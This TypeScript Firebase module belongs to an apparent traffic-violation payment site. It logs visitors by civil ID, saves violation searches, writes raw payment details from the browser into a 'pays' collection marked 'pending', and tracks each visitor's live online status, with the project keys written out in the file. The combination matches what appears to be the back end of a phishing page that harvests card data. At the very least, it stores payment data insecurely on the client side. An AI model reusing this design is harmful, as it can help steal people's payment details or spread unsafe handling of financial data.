import {
  collection,
  addDoc,
  serverTimestamp,
  setDoc,
  doc,
  getFirestore,
} from 'firebase/firestore';
import { initializeApp } from 'firebase/app';
import {ref,onValue, set, onDisconnect, getDatabase,
} from 'firebase/database';
const firebaseConfig = {
  // Your Firebase configuration will be injected here
  apiKey: "AIzaSyCGXGWc8wON-OL0mEi2vX_B5K7PytlHjfw",
  authDomain: "ah-moror.firebaseapp.com",
  projectId: "ah-moror",
  storageBucket: "ah-moror.firebasestorage.app",
  messagingSenderId: "869838548515",
  appId: "1:869838548515:web:9d1bb5c87d96d2f2d74b96",
  measurementId: "G-4VGVLNQK1L"
};

const app = initializeApp(firebaseConfig);
export const db = getFirestore(app);
export const database = getDatabase(app);

interface VisitorData {
  civilId: string;
  timestamp: any;
  userAgent: string;
  violations?: any[];
}

export async function logVisitor(civilId: string): Promise<string> {
  try {
    const visitorRef = await addDoc(collection(db, 'visitors'), {
      civilId,
      timestamp: serverTimestamp(),
      userAgent: navigator.userAgent,
    } as VisitorData);

    return visitorRef.id;
  } catch (error) {
    console.error('Error logging visitor:', error);
    throw error;
  }
}

export async function saveViolationSearch(
  civilId: string,
  violations: any[]
): Promise<string> {
  try {
    const searchRef = await addDoc(collection(db, 'searches'), {
      civilId,
      violations,
      timestamp: serverTimestamp(),
    });

    return searchRef.id;
  } catch (error) {
    console.error('Error saving search:', error);
    throw error;
  }
}
export async function addData(data: any) {
  localStorage.setItem('visitor', data.id);
  try {
    const docRef = await doc(db, 'pays', data.id!);
    await setDoc(docRef, data);

    console.log('Document written with ID: ', docRef.id);
    // You might want to show a success message to the user here
  } catch (e) {
    console.error('Error adding document: ', e);
    // You might want to show an error message to the user here
  }
}
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem('visitor');
    if (visitorId) {
      const docRef = doc(db, 'pays', visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: 'pending' },
        { merge: true }
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
    }
  } catch (error) {
    console.error('Error adding document: ', error);
    alert('Error adding payment info to Firestore');
  }
};
export const handleIsOnline=()=>{
  const visitorId = localStorage.getItem('visitor');

  const connectionsRef = ref(database, "/activeConnections"); // Reference to active users
const userRef = ref(database, `/activeConnections/${visitorId}`); // Unique ID for the user

// Check Firebase connection status
const connectedRef = ref(database, ".info/connected");
onValue(connectedRef, (snapshot) => {
  if (snapshot.val() === true) {
    console.log("User is online ✅");

    // Add user to active connections
    set(userRef, { online: true, timestamp: new Date().toISOString() });

    // Remove user when they disconnect
    onDisconnect(userRef).remove();
  } else {
    console.log("User is offline ❌");
  }
});
}